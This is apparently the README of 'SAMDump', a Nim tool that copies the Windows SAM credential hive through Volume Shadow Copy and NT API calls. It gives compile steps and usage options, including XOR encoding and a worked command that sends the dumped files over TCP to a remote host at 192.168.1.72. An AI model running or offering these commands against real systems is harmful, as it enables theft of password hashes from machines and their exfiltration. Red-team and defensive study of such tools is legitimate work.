# SAMDump — Nim

Nim implementation using raw COM vtable calls for VSS and NT API (`NtCreateFile`, `NtReadFile`, `NtWriteFile`) for file operations.

## Requirements

- [Nim](https://nim-lang.org/) compiler (Windows, x86_64)
- Administrator privileges

## Compilation

```
nim c -d:release samdump.nim
```

## Usage

```
samdump.exe [OPTIONS]

Options:
  --save-local           Save files locally
  --output-dir DIR       Output directory (default: C:\Windows\tasks)
  --send-remote          Send files over TCP
  --host IP              Remote host (default: 127.0.0.1)
  --port PORT            Remote port (default: 7777)
  --xor-encode           XOR encode before save/send
  --xor-key KEY          XOR key (default: SAMDump2025)
  --disk DISK            Volume for shadow copy (default: C:\)
  --help                 Show help
```

### Save locally

```
samdump.exe --save-local --output-dir C:\temp
```

### Send to a remote server with XOR encoding

```
samdump.exe --send-remote --host 192.168.1.72 --port 7777 --xor-encode
```
